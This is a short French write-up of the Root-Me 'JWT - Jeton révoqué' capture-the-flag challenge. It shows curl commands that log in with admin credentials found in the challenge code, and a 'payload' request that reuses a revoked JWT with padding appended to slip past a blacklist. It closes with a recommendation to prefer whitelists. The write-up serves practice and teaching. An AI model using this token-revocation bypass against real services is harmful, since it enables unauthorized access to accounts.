https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Pour pouvoir faire ce challenge, on a récupéré les credentials de l'admin dans le code fourni puis on s'est connecté via curl :

curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login

Ce qui nous a permis d'obtenir un le token nécessaire pour avoir accès à l’endpoint /web-serveur/ch63/admin.

Payload :

curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ5MTkxNjMsIm5iZiI6MTc2NDkxOTE2MywianRpIjoiNWE2MDkzNGYtOTEyNy00MDAwLWI3OTAtM2QxMzA3NWZhYzUzIiwiZXhwIjoxNzY0OTE5MzQzLCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0._VS7n58oXlOSa5RgP0m4LB-yY5mSKSgv8KWT_8VTQM0= " http://challenge01.root-me.org/web-serveur/ch63/admin

Recommandations :

- Privilégier l'utilisation d'une white list au lieu d'une black list 